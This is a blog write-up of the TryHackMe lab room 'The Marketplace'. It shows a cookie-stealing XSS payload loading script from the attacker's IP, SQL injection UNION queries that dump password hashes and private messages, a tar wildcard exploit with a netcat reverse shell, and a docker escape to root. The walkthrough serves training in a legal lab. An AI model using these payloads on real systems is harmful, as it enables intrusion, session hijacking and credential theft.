---
title: "The Marketplace"
date: 2024-03-18
draft: false
description: TryHackMe's Good Room
Tags:
- TryHackMe
- Linux
- Medium
---

## Enumeration

Lets do a simple port scan.
```
nmap -sVC 10.10.204.119             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-18 15:15 +0545
Nmap scan report for 10.10.204.119 (10.10.204.119)
Host is up (0.19s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
|_http-server-header: nginx/1.19.2
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: The Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.56 seconds
```

Lets check the port 80 and port 32768.
Hmm interesting.
![](Pasted%20image%2020250318151937.png)

I sighed up as admin and logged in.
![](Pasted%20image%2020250318152100.png)

Hmm now lets check out the features of this site.

I tried a simple xxs script in `/new`.
```js
<script>alert(0)</script>
```
![](Pasted%20image%2020250318152226.png)

## Exploit

Hmmm so it has a XXS vulnerability.
So this page is vulnerable with xss.
![](Pasted%20image%2020250318152348.png)

Okay lets try XXS and try to do something like extracting a cookies.
Lets try using a cookie grabber.
[xxs cookie grabber](https://github.com/TeneBrae93/xss-cookie-stealer)

And we were successful.
![](Pasted%20image%2020250318155125.png)

Lets try using that cookie we got.
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjQsInVzZXJuYW1lIjoiYWRtaW4iLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTc0MjI5MDU0M30.518zN1wULTi5aRwEKC_SqOgy_wme3YG16gKt7HcMggU`

But its mine.
![](Pasted%20image%2020250318155325.png)

There might be more thing on web page.

Hmm we can report and its saying that admin will see.
![](Pasted%20image%2020250318155446.png)

Lets also try this.
![](Pasted%20image%2020250318155539.png)

We might use this.
Okay i again used `/new` and inserted this.
`<script src="http://10.17.11.3/script.js"></script>`

Cause this will contact to us and use our script.js,it will grab a cookie.
![](Pasted%20image%2020250318161412.png)

So here,first. i placed that payload which executed and gave us with our cookie and in second time,we reported it to admin or system user and got the precious cookie.
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE3NDIyOTM3Mjh9.KGelVuS5sG1XUSgS2vjyCg8hFGPlHcRV0f0L8ZLcTbQ`

Lets try putting this and see what happes.
And we were successful.
![](Pasted%20image%2020250318161717.png)


Hmm so how can we get a rce or shell from this?
Lets see.
We can delete user.
![](Pasted%20image%2020250318162130.png)

Lets try to find more vulnerability.
![](Pasted%20image%2020250318162419.png)

Hmmm SQLI?
Might be.
Lets see.

I tried `sqlmap` and also tried manual union attack.
![](Pasted%20image%2020250318163059.png)

Hmmm nothing seems working.
So we passed a `'` in starting.
Hmm lets try not putting that.
![](Pasted%20image%2020250318163825.png)

It might because at first it is expecting any number like 1 or 2 or 3 and it will all be in proper syntax but if we again put `'` , there will be syntax error.
So we are directly gonna pass our union payload and it worked.
![](Pasted%20image%2020250318163909.png)

Hmmm now we might grab the credentials.
But still its not showing error but also not giving good output that we need.
And suddenly,I remember that if we pass the first value which is 1 in this time with non existing then my expected output should be shown cause the regular output isn't there.

And we can see the magic.
![](Pasted%20image%2020250318164821.png)

Now lets try to grab the creds.
![](Pasted%20image%2020250318164924.png)

![](Pasted%20image%2020250318164954.png)

```SQL
14 UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database();-- -

```

this gave this.
![](Pasted%20image%2020250318165112.png)

Hmm items.

```SQL
14 UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users';-- -`
```

I gave a shot with the table users and it resulted with a column name id.

Now we can do this.
```SQL
14 UNION SELECT username,password,password,4 FROM users;-- -

```

And got the username and password hash.
![](Pasted%20image%2020250318165530.png)

```SQL
username:system
password_hash:$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW
```

We can also use concat to get better results cause this hash mightn't be full.
```SQL
14 UNION SELECT 1,GROUP_CONCAT(username, ':', password SEPARATOR ' | '),3,4 FROM users;-- -

```

And we got the better result.
![](Pasted%20image%2020250318170006.png)

```Q
User system:$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW | michael:$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q | jake:$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG | admin:$2b$10$qUVwwiluchM7Bd6EXups5.3keuwY8KoYItAzWngnBYxtonwP3B4IG | test:$2b$10$EdLDv/f8esSnwagwb401pOb5fU/302b1rSxr1rmPze//M/SDJlz4G  
ID: 1  
Is administrator: true
```

We got the all user's password hash and usernames too seperated by `|`.
We have these hashes.
![](Pasted%20image%2020250318170311.png)

Lets try cracking there hashes.
```bash
hashcat -m 3200 -a 0 user_hash.txt /usr/share/wordlists/rockyou.txt --force
```

But even after a very long time,it didn't worked.

## Foothold

Lets again enumerate the sql.

```SQL
14 UNION SELECT 1,GROUP_CONCAT(table_name, ':', column_name SEPARATOR ' | '),3,4 FROM information_schema.columns WHERE table_schema=database();-- -
```

Putting these will provide different things.
![](Pasted%20image%2020250318171302.png)

So we got this.
```Q
User items:author | items:description | items:id | items:image | items:title | messages:id | messages:is_read | messages:message_content | messages:user_from | messages:user_to | users:id | users:isAdministrator | users:password | users:username
```

So we found tables like `items,messages,users,` and differents columns of these tables.
So we might have to read messages.
Lets try reading it using `group_concat()`.
So we have to read `message_content`, `user_from` and `user_to` .

```SQL
14 UNION SELECT 1,GROUP_CONCAT(user_from, '->', user_to, ':', message_content SEPARATOR ' | '),3,4 FROM messages;-- -
```
Lets see how it works.
And we got something.
![](Pasted%20image%2020250318172059.png)

Hmmm.
```Q
User 1->3:Hello! An automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password. Your new password is: @b_ENXkGYUCAv3zJ | 4->4:<script>alert(0)<script> | 1->4:Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! | 1->4:Thank you for your report. We have been unable to review the listing at this time. Something may be blocking our ability to view it, such as alert boxes, which are blocked in our employee's browsers. | 4->4:<script src="http://10.17.11.3/script.js"></script> | 4->2:<script src="http://10.17.11.3/script.js"></script> | 4->2:<script src="http://10.17.11.3/script.js"></script> | 4->4:<script src="http://10.17.11.3/script.js"></script> | 1->4:Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private
```

So we got the password.
`@b_ENXkGYUCAv3zJ`

Lets see in which user we can connect the ssh on.
We have there users.
![](Pasted%20image%2020250318172421.png)

Lets try.
And we were successful with the user jake.
![](Pasted%20image%2020250318172602.png)

## privilele Escalation

Lets try to escalate our privileles.
Doing 
```bash
sudo -l
```

revealed this.
![](Pasted%20image%2020250318172900.png)

Hmm.
![](Pasted%20image%2020250318172937.png)

So we have to exploit classic tar with wildcard characters exploit.
Hmm lets see.
So let do this.
`echo "" > '--checkpoint=1'`
`echo "" > '--checkpoint-action=exec=sh shell.sh'`

And a shell.sh.
```bash
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.17.11.3 9999 >/tmp/f

```

Lets execute that script`/opt/backups/backup.sh`.
```bash
chmod 777 /opt/backups/backup.tar
sudo -u michael /opt/backups/backup.sh

```
![](Pasted%20image%2020250318175214.png)

And we got the reverse shell in our listenner.
![](Pasted%20image%2020250318175237.png)

Lets try to escalate our privilele's to root.
Lets run `linpeas.sh`.

Hmm interesting.
![](Pasted%20image%2020250318175758.png)
![](Pasted%20image%2020250318180003.png)

Hmm lets try to privilele' escalate with docker.
I have done some of the rooms where we need to use docker.
Those are little different but first of all lets try docker privilele' escalation with [gtfobins](https://gtfobins.github.io/gtfobins/docker/)
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
And it worked.
![](Pasted%20image%2020250318180851.png)

## Done

And done.
![](Pasted%20image%2020250318181014.png)

This was one of the best rooms in my opinion.
I hope you also learned new things with me.
